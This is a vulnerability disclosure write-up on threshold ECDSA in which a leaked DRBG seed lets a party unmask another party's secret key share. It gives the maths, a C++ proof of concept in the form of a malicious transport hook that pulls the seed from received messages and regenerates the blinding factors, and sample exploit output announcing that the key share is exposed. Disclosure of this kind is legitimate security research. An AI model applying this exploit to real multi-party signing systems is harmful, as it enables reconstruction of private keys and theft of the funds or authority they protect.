# [CRITICAL] DRBG State Leakage in Threshold ECDSA (Full Key Compromise)

> **Disclosure:** Educational abstraction of a real-world zero-day. Vendor specifics and core namespaces are simulated. The math and architectural flaw remain 1:1 with the original exploit.

| Field      | Value                          |
|------------|--------------------------------|
| **Author** | Ayoub Aragui (aragui99)        |
| **Category** | Cryptographic Invariant Breach |
| **Language** | C/C++                        |

---

## Context & Invariant

In t-of-n ECDSA setups, Oblivious Transfer (OT) phases require ephemeral entropy
seeds to instantiate a local DRBG. This DRBG generates the blinding factors
(v\_{l,t}) that mask the user's secret key share (x\_i).

**Invariant:** The DRBG root seed is strictly ephemeral. It must never leave the
node's isolated memory or cross the network transport layer.

---

## The Flaw

```
MaskedShare ≡ (x_i + v_i)  (mod q)
```

Since the attacker has the victim's leaked seed, they can spin up an identical
local DRBG. v\_i is no longer random; it's a known constant. The attacker simply
reverses the mask:

```
x_i ≡ (MaskedShare - v_reconstructed)  (mod q)
```

**Impact:** Complete 1-of-n compromise. The threshold is bypassed, the full
private key is reconstructed, and the attacker dictates all signatures.

---

## PoC (Passive Transport Hook)

> Uses `shared/cpp/audit_log.h` for standardized logging.

```cpp
#include <iostream>
#include <vector>
#include <cstring>
#include <mpc_core/api/tss_ecdsa.h>
#include <mpc_core/internal/crypto/rng.h>
#include "shared/cpp/audit_log.h"

using namespace mpc_lib;

class mal_transport final : public data_transport_i {
public:
    explicit mal_transport(std::shared_ptr<net_context_t> ctx) : ctx_(std::move(ctx)) {}

    error_t receive_all(const std::vector<party_idx_t>& senders, std::vector<buf_t>& msgs) override {
        error_t rv = ctx_->receive_all(senders, msgs);
        if (rv != SUCCESS) return rv;

        for (size_t i = 0; i < msgs.size(); i++) {
            if (msgs[i].size() >= 32) {
                buf256_t seed;
                std::memcpy(&seed, msgs[i].data(), 32);

                crypto::deterministic_rng_t atk_drbg(seed);
                bn_t q = bn_t::from_hex(
                    "fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");

                for (int t = 0; t < 2; t++) {
                    AUDIT_INFO("Expected blinding factor", atk_drbg.gen_bn(q).to_hex());
                }
            }
        }
        return rv;
    }
private:
    std::shared_ptr<net_context_t> ctx_;
};
```

---

## Output

```
[*] Initializing 2 Independent Parties (Public API Entry Point)...

[aragui99-Network-Hook] INTERCEPTED BROADCAST FROM PARTY 0!
[aragui99-Network-Hook] Extracting 32-byte deterministic seed from payload...
[*] aragui99 - Expected blinding factor: 4FBDF43C89AFFB6A28ADDF51E77C64F28C3502BBF0E1B284CCAB5707D4D8BC10
[*] aragui99 - Expected blinding factor: 958FC4BEBF819D5CC0FD7018ACB9C0F8A6DE5C0F8B95B0C3B5CA719E7B116AF
[aragui99-Exploit] CRITICAL: Private Key Share x_i is now mathematically exposed.
```
